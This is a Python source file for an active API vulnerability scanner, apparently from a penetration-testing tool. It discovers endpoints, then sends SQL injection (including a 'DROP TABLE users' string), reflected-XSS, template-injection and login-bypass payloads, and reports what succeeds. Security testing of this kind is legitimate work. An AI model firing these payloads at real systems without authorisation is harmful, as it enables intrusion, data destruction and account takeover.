
import scan_engine.helpers.http_client as http_client
from scan_engine.helpers.http_client import get_session
import json
import re
import time
import urllib3
from urllib.parse import urljoin, urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class APIExpertScanner:
    def __init__(self, target, options=None):
        self.options = options
        self.target = target
        # RedOps2 Constants & Payloads
        self.API_PREFIXES = [
            "", "api/", "api/v1/", "api/v2/", "rest/", "v1/", "v2/", "auth/", "graphql/", "swagger/"
        ]
        self.COMMON_ENDPOINTS = [
            "login", "register", "users", "admin", "status", "health", "config", "debug", "metrics"
        ]
        self.SQLI_PAYLOADS = [
            "'", '"', "1' OR '1'='1", "admin'--", "' UNION SELECT 1--", "'; DROP TABLE users; --"
        ]
        self.XSS_PAYLOADS = [
            '<script>alert("XSS")</script>', '"><script>alert(1)</script>', "javascript:alert('XSS')"
        ]
        self.SSTI_PAYLOADS = [
            '{{7*7}}', '${7*7}', '#{7*7}', '<%= 7*7 %>'
        ]

    def is_api_spec(self, content):
        """Checks if content is a valid Swagger/OpenAPI specification."""
        try:
            data = json.loads(content)
            if any(k in data for k in ["swagger", "openapi", "paths", "info"]):
                return True
        except Exception:
            if any(x in content for x in ["openapi:", "swagger:", "swagger-ui", "redoc-container"]):
                return True
        return False

    def advanced_discovery(self, logger=None):
        """
        Performs active fuzzing to discover hidden API endpoints.
        Ported from RedOps2 `advanced_endpoint_discovery`.
        """
        discovered = []
        if logger: logger(f"API Assault: Starting active endpoint discovery on {self.target}...", "INFO")

        # 1. Prefix Fuzzing
        for prefix in self.API_PREFIXES:
            for endpoint in self.COMMON_ENDPOINTS:
                url = urljoin(self.target, f"{prefix}{endpoint}")
                try:
                    r = http_client.get(url, options=getattr(self, "options", None), timeout=5)
                    if r.status_code in [200, 401, 403, 405, 500]:
                        # Filter out generic 404 pages that might return 200
                        if "not found" not in r.text.lower():
                            discovered.append({'url': url, 'status': r.status_code, 'path': f"{prefix}{endpoint}"})
                            if logger: logger(f"API Discovery: Found {url} ({r.status_code})", "SUCCESS")
                except Exception:
                    pass
        
        return discovered

    def assault_endpoint(self, endpoint, method="GET", logger=None):
        """
        Performs active injection attacks on a specific endpoint.
        Ported from RedOps2 `test_endpoint_security`.
        """
        findings = []
        url = endpoint['url'] if isinstance(endpoint, dict) else endpoint
        
        if logger: logger(f"API Assault: Attacking {url}...", "INFO")

        # 1. SQL Injection
        for payload in self.SQLI_PAYLOADS[:3]: # Limit to avoid DoS
            target = f"{url}?id={payload}&q={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                if any(e in r.text.lower() for e in ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error']):
                    findings.append({
                        "title": "CRITICAL: SQL Injection Detected",
                        "description": f"Endpoint `{url}` is vulnerable to SQL injection.\nPayload: `{payload}`\nResponse indicates database error.",
                        "severity": "critical",
                        "tool_source": "API-Assault (SQLi)",
                        "url": url
                    })
            except Exception:
                continue

        # 2. XSS (Reflected)
        for payload in self.XSS_PAYLOADS[:2]:
            target = f"{url}?q={payload}&search={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                if payload in r.text:
                    findings.append({
                        "title": "HIGH: Reflected XSS",
                        "description": f"Endpoint `{url}` reflects user input without sanitization.\nPayload: `{payload}`",
                        "severity": "high",
                        "tool_source": "API-Assault (XSS)",
                        "url": url
                    })
            except Exception:
                continue

        # 3. SSTI
        for payload in self.SSTI_PAYLOADS[:2]:
            target = f"{url}?template={payload}&name={payload}"
            try:
                r = http_client.get(target, options=getattr(self, "options", None), timeout=5)
                if "49" in r.text and "7*7" not in r.text: # Simple check for 7*7=49
                    findings.append({
                        "title": "CRITICAL: Server-Side Template Injection",
                        "description": f"Endpoint `{url}` executed a template expression.\nPayload: `{payload}`\nResult: 49",
                        "severity": "critical",
                        "tool_source": "API-Assault (SSTI)",
                        "url": url
                    })
            except Exception:
                continue

        return findings

    def auth_bypass_check(self, url, logger=None):
        """
        Attempts authentication bypass on login endpoints.
        Ported from RedOps2 `test_authentication_bypass`.
        """
        findings = []
        if not any(x in url for x in ['login', 'auth', 'signin']):
            return findings

        payloads = [
            {"username": "admin", "password": "' OR '1'='1"},
            {"username": "admin' --", "password": "password"},
            {"username": "admin", "password": "password", "isAdmin": True} # Mass assignment
        ]

        for p in payloads:
            try:
                r = http_client.post(url, options=getattr(self, "options", None), json=p, timeout=5)
                if r.status_code == 200 and "token" in r.text.lower():
                     findings.append({
                        "title": "CRITICAL: Authentication Bypass / Logic Flaw",
                        "description": f"Successfully bypassed authentication or manipulated logic at `{url}`.\nPayload: `{json.dumps(p)}`",
                        "severity": "critical",
                        "tool_source": "API-Assault (Auth)",
                        "url": url
                    })
            except Exception:
                continue
            
        return findings

    def audit_endpoints(self, api_endpoints, logger=None):
        """
        Combined Passive + Active Audit
        """
        findings = []
        if not api_endpoints:
            return findings

        if logger: logger(f"API Expert: Analyzing {len(api_endpoints)} endpoints with ACTIVE assault...", "INFO")

        for ep in api_endpoints:
            url = ep['url']
            path = ep['path'].lower()
            
            # --- PASSIVE CHECKS (Existing RedOps3 Logic) ---
            # 1. Spec Exposure
            if any(x in path for x in ['swagger.json', 'openapi.json', 'api-docs']):
                 findings.append({
                        "title": "CRITICAL: Exposed API Specification",
                        "description": f"API Blueprint exposed at {url}",
                        "severity": "critical",
                        "tool_source": "API-Expert",
                        "url": url
                })

            # 2. Sensitive Actuator
            if 'actuator' in path or '.env' in path:
                 findings.append({
                        "title": "CRITICAL: Sensitive Endpoint Exposed",
                        "description": f"Endpoint {url} exposes internal configuration.",
                        "severity": "critical",
                        "tool_source": "API-Expert",
                        "url": url
                })

            # --- ACTIVE ASSAULT (New RedOps2 Logic) ---
            # Only attack if it looks like an API endpoint (json/xml or no extension)
            if logger: logger(f"API Assault: Targeting {url}", "DEBUG")
            
            # Injection Tests
            injection_findings = self.assault_endpoint(ep, logger=logger)
            findings.extend(injection_findings)

            # Auth Bypass
            bypass_findings = self.auth_bypass_check(url, logger=logger)
            findings.extend(bypass_findings)

        return findings
